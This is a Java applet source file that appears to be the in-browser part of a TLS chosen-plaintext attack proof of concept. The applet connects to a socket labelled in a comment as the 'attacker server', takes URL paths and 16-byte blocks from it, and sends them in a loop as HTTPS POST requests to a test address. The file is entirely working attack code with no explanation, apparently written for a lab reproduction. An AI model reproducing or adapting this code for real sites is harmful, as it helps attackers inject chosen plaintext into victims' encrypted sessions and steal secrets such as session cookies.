import java.io.OutputStream;
import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import javax.net.ssl.HttpsURLConnection;
import java.net.Socket;
import java.io.InputStream;

public class sslApplet extends java.applet.Applet {
    public void init() {
        try {
            //Connect to attacker server via a socket to receive data
            String externalHost = "127.0.0.3";
            int externalPort = 1337;  
            Socket socket = new Socket(externalHost, externalPort);
            
            
            String baseUrl = "https://127.0.0.3:443/";

            while (true) {
                // Receive the URL file path (assuming it's a line of text)
                BufferedReader socketReader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                String filePath = socketReader.readLine();

                // Construct the full URL
                String fullUrl = baseUrl + filePath;
                URL url = new URL(fullUrl);
            
                // Open a connection to the URL
                HttpsURLConnection connection = (HttpsURLConnection) url.openConnection();
                connection.setRequestMethod("POST");
                
                // Enable input and output streams
                connection.setDoOutput(true);

                connection.setRequestProperty("Content-Type", "text/plain");
                connection.setFixedLengthStreamingMode(16);
                connection.connect();

                OutputStream os = connection.getOutputStream();
                connection.connect();
                
                //Read data from the socket
                byte[] dataFromSocket = new byte[16];
                InputStream socketInput = socket.getInputStream();
                int totalBytesRead = 0;
                while (totalBytesRead < 16) {
                    int bytesRead = socketInput.read(dataFromSocket, totalBytesRead, 16 - totalBytesRead);
                    if (bytesRead == -1) {
                        socket.close();
                        throw new Exception("Socket closed unexpectedly.");
                    }
                    totalBytesRead += bytesRead;
                }

                os.write(dataFromSocket);
                os.flush();
                os.close();

                // Get the response from the server
                BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                String inputLine;
                StringBuffer content = new StringBuffer();
                while ((inputLine = in.readLine()) != null) {
                    content.append(inputLine);
                }
                in.close();
                
                // Handle the response (e.g., print it or process it as needed)
                System.out.println(content.toString());
            }
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
